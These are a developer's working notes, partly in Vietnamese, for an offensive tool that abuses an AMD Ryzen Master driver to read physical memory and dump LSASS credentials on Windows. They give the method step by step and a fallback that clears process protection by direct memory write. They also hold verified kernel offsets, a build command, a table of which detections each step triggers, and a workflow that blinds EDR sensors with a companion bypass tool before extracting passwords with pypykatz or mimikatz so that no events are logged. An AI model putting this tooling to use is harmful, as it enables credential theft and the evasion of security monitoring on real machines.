# LSASS Dump — Notes & Status

> Tool: `lsass_dump.exe` (164.1 KB)  
> Primitive: AMDRyzenMasterDriverV20 IOCTL 0x81112F08/0x81112F0C  
> Updated: 2026-06-02

---

## Kết quả test

| Machine | OS | Result | Ghi chú |
|---|---|---|---|
| Máy 1 | Win10 21H2 (19044) — physical | ✅ **WORKS** | Page walk OK, dump thành công |
| kuvee | Win10 19044.7291 — Hyper-V VM | ⚠️ Partial | EPROCESS found, page walk FAIL (SLAT) |
| admin1 | Win11 25H2 (26200) — Hyper-V VM | ❌ FAIL | EPROCESS không tìm được (SLAT full) |

---

## Root Cause của VM failures

Hyper-V dùng **SLAT (Second Level Address Translation / Nested Page Tables)** để map Guest Physical Addresses → Host Physical Addresses. AMD driver dùng `MmMapIoSpace(GPA)` — hypervisor **protect page table pages** trong SLAT, không cho guest đọc trực tiếp.

```
AMD driver IOCTL → MmMapIoSpace(PA) → Hyper-V SLAT check
                                              ↓
                    Data pages: OK     Page table pages: BLOCKED
```

**Trên physical machine:** Không có SLAT layer → `MmMapIoSpace` đọc được tất cả → approach hoạt động hoàn toàn.

---

## Flow hoạt động (physical machine)

```
1. Open AMD driver
2. Load physical RAM ranges (registry)
3. Find kernel CR3:
     Pass 1: self-ref at slot 0x1ED (Win10/early Win11)
     Pass 2: randomized slot 0x100-0x1FF (Win11 22H2+)
     Validate: PML4 entry for ntoskrnl PML4 index must be present
               (tránh KPTI UserCR3 false positive)
4. Method A — Kernel list walk:
     NtQuerySystemInformation(11) → ntoskrnl VA + disk path
     pe_export_rva(disk PE, "PsInitialSystemProcess") → RVA
     kva_to_pa(ntoskrnl_va + RVA) → read System EPROCESS VA
     Walk ActiveProcessLinks → find PID == lsass_pid
     Thử tất cả layouts (Win10-1903+, Win10-1709/1803/1809, Win10-1607, Win10-1507)
5. Method B — Physical RAM scan (fallback):
     Scan tìm byte sequence "lsass.exe" (stride=1, không cần alignment)
     Với mỗi hit: thử 4 EPROCESS layouts (multi-version)
     Validate: PID, printable name, kernel pointer guards, DTB aligned
     KHÔNG dùng pa_in_range (tránh cross-boundary miss)
6. Read LSASS DirectoryTableBase (CR3) từ EPROCESS+0x028
     Nếu CR3 page blocked: thử UserDirectoryTableBase tại offsets
     0x280, 0x258, 0x260, 0x388, 0x390 (KPTI shadow CR3)
7. Walk LSASS page tables (4 levels: PML4→PDPT→PD→PT):
     User space only (PML4 index 0..127)
     Support 1GB / 2MB / 4KB pages
     Không dùng pa_in_range guards → phys_read failure làm guard
8. Discover modules (scan MZ headers trong pages)
9. Merge pages → contiguous regions
10. Write MiniDump (Memory64ListStream format):
      SystemInfoStream + ModuleListStream + Memory64ListStream
      Streaming write — không load toàn bộ dump vào RAM
```

---

## Fallback path (Hyper-V VM, Win10, no Huorong)

Khi page walk fail (SLAT), tool tự động fallback:

```
1. Find Protection offset via write-test + NtQIP ground truth
   Candidates: 0x4FA, 0x87A, 0x6B0, 0x878, 0x880, ...
2. phys_write(EPROCESS + prot_off, 0)  ← clear PPL (no OpenProcess needed)
3. OpenProcess(PROCESS_ALL_ACCESS, lsass_pid)
4. MiniDumpWriteDump(MiniDumpWithFullMemory) → lsass.dmp
5. phys_write restore Protection
```

**Detection risk:** MiniDumpWriteDump trigger ETW-TI event → run `edr_bypass.exe` trước để blind ETW-TI.

---

## Known issues / limitations

### 1. KPTI UserCR3 false positive (fixed)
Win10 1803+ dùng 2 page tables per process:
- `KernelCR3` (full): maps everything, self-ref at randomized slot
- `UserCR3` (shadow): chỉ user space + syscall stub, có thể có self-ref tại 0x1ED

Old code accept UserCR3 → kva_to_pa fail cho kernel VAs.  
**Fix:** Validate CR3 bằng cách check PML4 entry cho ntoskrnl PML4 index (UserCR3 không có entry này).

### 2. Physical scan cross-boundary miss (fixed)
Nếu EPROCESS base ở cuối range N và "lsass.exe" ở đầu range N+1, `pa_in_range(epa, read_sz)` bị false negative.  
**Fix:** Bỏ `pa_in_range` guard trong inner loop, chỉ dùng `phys_read` failure.

### 3. Hyper-V page table pages blocked (known limitation)
`MmMapIoSpace` fail cho page table pages khi guest chạy dưới Hyper-V SLAT.  
**Workaround:** Fallback MiniDumpWriteDump (Win10 no Huorong) hoặc physical machine.

### 4. Win25H2 + Hyper-V: EPROCESS không tìm được
Trên Hyper-V strict (admin1 machine), kernel pool pages cũng bị block.  
Physical scan của toàn bộ g_ranges không tìm thấy "lsass.exe".  
**Status:** Cần kernel code execution (Shadow SSDT, APC) để đọc từ ring-0 context.

### 5. Huorong watchdog
`hrdevmon.sys` có kernel thread monitor EPROCESS.Protection → restore về 0x41.  
Evidence: 9/9 write-test candidates bị restore sau all-core cache eviction.  
**Workaround (pending):** IRP hook patch hrdevmon.sys MajorFunction[] + Direct PA dump (không cần OpenProcess).

---

## Detection profile

| Component | Windows event? | EDR hook? | ETW event? |
|---|---|---|---|
| AMD driver IOCTL read | ❌ None | ❌ No hook | ❌ None |
| phys_read (page walk) | ❌ None | ❌ None | ❌ None |
| OpenProcess (fallback) | ✅ Event 4688 (optional) | ✅ OB callback | ✅ ETW |
| MiniDumpWriteDump (fallback) | ✅ Event 4663 | ✅ minifilter | ✅ ETW-TI |

**Run `edr_bypass.exe` trước** để blind tất cả:  
OB callbacks → disabled, minifilter → unlinked, ETW-TI → disabled, Ps\* notify → zeroed.

Sau đó MiniDumpWriteDump và Physical page dump đều **không để lại event nào.**

---

## EPROCESS offsets đã verify

```c
// Stable Win10 1903+ / Win11 (confirmed Win10 21H2 + Win10 19044.7291)
EP_OFF_DTB   = 0x028   // Pcb.DirectoryTableBase (ALWAYS at +0x28)
EP_OFF_PID   = 0x440   // UniqueProcessId
EP_OFF_FLINK = 0x448   // ActiveProcessLinks.Flink
EP_OFF_BLINK = 0x450   // ActiveProcessLinks.Blink
EP_OFF_TOKEN = 0x4B8   // Token
EP_OFF_NAME  = 0x5A8   // ImageFileName[15]

// Win10 1709/1803/1809
EP_OFF_NAME  = 0x450, EP_OFF_PID = 0x2E8, EP_OFF_FLINK = 0x2F0
```

---

## Build command

```
x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function -Wno-format-truncation \
    -o lsass_dump.exe lsass_dump.c -lkernel32 -ladvapi32
```

---

## Parse output

```bash
# pypykatz
pypykatz lsa minidump lsass.dmp

# mimikatz offline
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## Recommended workflow (physical machine)

```
Step 1:  edr_bypass.exe          # blind all EDR sensors
Step 2:  lsass_dump.exe          # dump LSASS → lsass.dmp
Step 3:  pypykatz lsa minidump lsass.dmp  # extract credentials
```

Total time: ~30-60 seconds. Zero Windows event log entries.
